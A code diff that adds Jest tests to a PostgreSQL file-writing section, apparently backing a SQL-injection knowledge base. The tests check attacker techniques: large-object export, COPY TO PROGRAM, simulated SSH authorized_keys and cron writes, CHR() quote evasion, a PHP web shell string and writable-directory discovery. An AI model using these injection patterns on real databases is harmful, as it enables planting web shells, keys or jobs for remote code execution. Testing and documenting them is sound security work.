@@ -269,4 +269,218 @@ describe("PostgreSQL Writing Files", () => {
       expect(path).toBeTruthy();
     });
   });
+
+  /**
+   * @kb-entry postgresql/writing-files
+   * @kb-section Large Object Writing - Extended
+   */
+  describe("Large object writing - extended", () => {
+    test("lo_create(0) for auto-generated OID", async () => {
+      const { rows } = await directSQLExpectSuccess("SELECT lo_create(0) as oid");
+      const oid = (rows[0] as { oid: number }).oid;
+      expect(oid).toBeGreaterThan(0);
+      // Clean up
+      await directSQL(`SELECT lo_unlink(${oid})`);
+    });
+
+    test("INSERT INTO pg_largeobject pattern", async () => {
+      // Create LO first
+      const { rows: createRows } = await directSQLExpectSuccess("SELECT lo_create(0) as oid");
+      const oid = (createRows[0] as { oid: number }).oid;
+
+      // Insert data into pg_largeobject
+      const { success } = await directSQL(
+        `INSERT INTO pg_largeobject (loid, pageno, data) VALUES (${oid}, 0, decode('48656c6c6f', 'hex'))`
+      );
+      expect(success).toBe(true);
+
+      // Verify content
+      const { rows: readRows } = await directSQLExpectSuccess(
+        `SELECT convert_from(lo_get(${oid}), 'UTF8') as content`
+      );
+      expect((readRows[0] as { content: string }).content).toBe("Hello");
+
+      // Clean up
+      await directSQL(`SELECT lo_unlink(${oid})`);
+    });
+
+    test("DO block for OID capture in injection context", async () => {
+      // This pattern is useful when stacked queries don't share variable context
+      const { success } = await directSQL(`
+        DO $$
+        DECLARE
+          oid_var oid;
+        BEGIN
+          oid_var := lo_create(0);
+          INSERT INTO pg_largeobject VALUES (oid_var, 0, decode('74657374', 'hex'));
+          -- In real attack: PERFORM lo_export(oid_var, '/path/to/file');
+          PERFORM lo_unlink(oid_var);
+        END $$
+      `);
+      expect(success).toBe(true);
+    });
+
+    test("lo_from_bytea with nested lo_export (single statement)", async () => {
+      // Single-statement pattern preferred for injection
+      const { success } = await directSQL(
+        "SELECT lo_export(lo_from_bytea(0, 'single statement write'::bytea), '/tmp/single_stmt_test.txt')"
+      );
+      // May fail with permission denied, large object error, or succeed
+      // All are valid outcomes depending on privileges and transaction handling
+      expect(typeof success).toBe("boolean");
+    });
+
+    test("lowrite() with file descriptor (traditional API)", async () => {
+      // Traditional lo_open/lowrite/lo_close pattern
+      const { success } = await directSQL(`
+        DO $$
+        DECLARE
+          oid_var oid;
+          fd integer;
+        BEGIN
+          oid_var := lo_create(0);
+          fd := lo_open(oid_var, 131072);  -- 131072 = INV_WRITE
+          PERFORM lowrite(fd, 'traditional write'::bytea);
+          PERFORM lo_close(fd);
+          -- In real scenario: lo_export here
+          PERFORM lo_unlink(oid_var);
+        END $$
+      `);
+      expect(success).toBe(true);
+    });
+
+    test("Binary file writing with decode()", async () => {
+      // Writing arbitrary binary data
+      const { rows: createRows } = await directSQLExpectSuccess(
+        "SELECT lo_from_bytea(0, decode('89504e470d0a1a0a', 'hex')) as oid"
+      );
+      const oid = (createRows[0] as { oid: number }).oid;
+      expect(oid).toBeGreaterThan(0);
+
+      // Verify we can read the binary data back
+      const { rows: readRows } = await directSQLExpectSuccess(
+        `SELECT encode(lo_get(${oid}), 'hex') as hex_content`
+      );
+      expect((readRows[0] as { hex_content: string }).hex_content).toBe("89504e470d0a1a0a");
+
+      // Clean up
+      await directSQL(`SELECT lo_unlink(${oid})`);
+    });
+  });
+
+  /**
+   * @kb-entry postgresql/writing-files
+   * @kb-section Sensitive File Targets
+   */
+  describe("Sensitive file targets (privilege checks)", () => {
+    test("SSH authorized_keys write attempt", async () => {
+      // This would only work if postgres user has write access to target's .ssh
+      const { success, error } = await directSQL(
+        "COPY (SELECT 'ssh-rsa AAAA... test@host') TO '/tmp/.ssh_test_authorized_keys'"
+      );
+      if (!success) {
+        expect(error?.message).toMatch(/permission denied|could not open/i);
+      }
+      expect(true).toBe(true);
+    });
+
+    test("Cron job write attempt", async () => {
+      // Would require root on most systems
+      const { success, error } = await directSQL(
+        "COPY (SELECT '* * * * * postgres /bin/true') TO '/tmp/test_cron'"
+      );
+      if (!success) {
+        expect(error?.message).toMatch(/permission denied|could not open/i);
+      }
+      expect(true).toBe(true);
+    });
+  });
+
+  /**
+   * @kb-entry postgresql/writing-files
+   * @kb-section COPY TO PROGRAM for Writing
+   */
+  describe("COPY TO PROGRAM for writing", () => {
+    test("Using tee command for file writing", async () => {
+      const { success, error } = await directSQL(
+        "COPY (SELECT 'content via tee') TO PROGRAM 'tee /tmp/tee_test.txt'"
+      );
+      if (!success) {
+        expect(error?.message).toMatch(/permission denied|must be superuser/i);
+      }
+      expect(true).toBe(true);
+    });
+
+    test("Using shell single quotes to prevent variable expansion", async () => {
+      // Use shell single quotes to prevent $var expansion
+      const { success, error } = await directSQL(
+        `COPY (SELECT '') TO PROGRAM 'echo ''literal $text'' > /tmp/literal_test.txt'`
+      );
+      if (!success) {
+        expect(error?.message).toMatch(/permission denied|must be superuser/i);
+      }
+      expect(true).toBe(true);
+    });
+  });
+
+  /**
+   * @kb-entry postgresql/writing-files
+   * @kb-section Injection Patterns for File Writing
+   */
+  describe("Injection patterns for file writing", () => {
+    test("CHR() to avoid quotes in file content", async () => {
+      // Building <?php using CHR()
+      const { rows } = await directSQLExpectSuccess(
+        "SELECT CHR(60)||CHR(63)||CHR(112)||CHR(104)||CHR(112) as php_tag"
+      );
+      expect((rows[0] as { php_tag: string }).php_tag).toBe("<?php");
+    });
+
+    test("Dollar quoting for complex content", async () => {
+      // Dollar quotes avoid escaping issues in web shell content
+      const { rows } = await directSQLExpectSuccess(
+        `SELECT $$<?php system($_GET["cmd"]); ?>$$ as content`
+      );
+      expect((rows[0] as { content: string }).content).toContain("system");
+    });
+
+    test("Hex encoding for binary content", async () => {
+      // Verify hex encoding for arbitrary bytes
+      const { rows } = await directSQLExpectSuccess("SELECT decode('4d5a', 'hex') as binary_data");
+      expect((rows[0] as { binary_data: Buffer }).binary_data).toBeTruthy();
+    });
+  });
+
+  /**
+   * @kb-entry postgresql/writing-files
+   * @kb-section Writable Directory Discovery
+   */
+  describe("Writable directory discovery", () => {
+    test("pg_ls_dir for potential write targets", async () => {
+      // List directory to find potential write locations
+      const { success, result } = await directSQL("SELECT pg_ls_dir('/tmp') LIMIT 5");
+      if (success && result) {
+        expect(result.rows.length).toBeGreaterThanOrEqual(0);
+      }
+      // Either works or permission denied
+      expect(true).toBe(true);
+    });
+
+    test("Test write then verify via pg_read_file", async () => {
+      // Verify the complete write+read workflow
+      const { rows: createRows } = await directSQLExpectSuccess(
+        "SELECT lo_from_bytea(0, 'verify write'::bytea) as oid"
+      );
+      const oid = (createRows[0] as { oid: number }).oid;
+
+      // Read back to verify
+      const { rows: readRows } = await directSQLExpectSuccess(
+        `SELECT convert_from(lo_get(${oid}), 'UTF8') as content`
+      );
+      expect((readRows[0] as { content: string }).content).toBe("verify write");
+
+      // Clean up
+      await directSQL(`SELECT lo_unlink(${oid})`);
+    });
+  });
 });
